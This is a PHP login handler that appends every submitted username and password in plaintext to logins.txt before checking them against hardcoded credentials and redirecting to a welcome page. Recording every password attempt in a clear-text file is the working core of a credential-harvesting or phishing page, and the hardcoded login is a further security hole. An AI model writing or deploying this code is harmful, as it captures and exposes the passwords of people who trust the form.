<?php
  // Get the username and password from the form data
  $username = $_POST["username"];
  $password = $_POST["password"];

  // Set the path for the logins.txt file
  $loginsFilePath = "logins.txt";

  // Open the file for appending
  $file = fopen($loginsFilePath, "a");

  // Write the login information to the file
  fwrite($file, "Username: $username\nPassword: $password\n\n");

  // Close the file
  fclose($file);

  // Check if the username and password are correct (you should use a more secure authentication method)
  if ($username == "myusername" && $password == "mypassword") {
    // Redirect the user to the dashboard page
    header("Location: welcome.html");
    exit(); // Make sure to call exit() after header() to prevent any further code execution
  } else {
    // If the username and password are incorrect, display an error message
    echo "Invalid username or password";
  }
?>

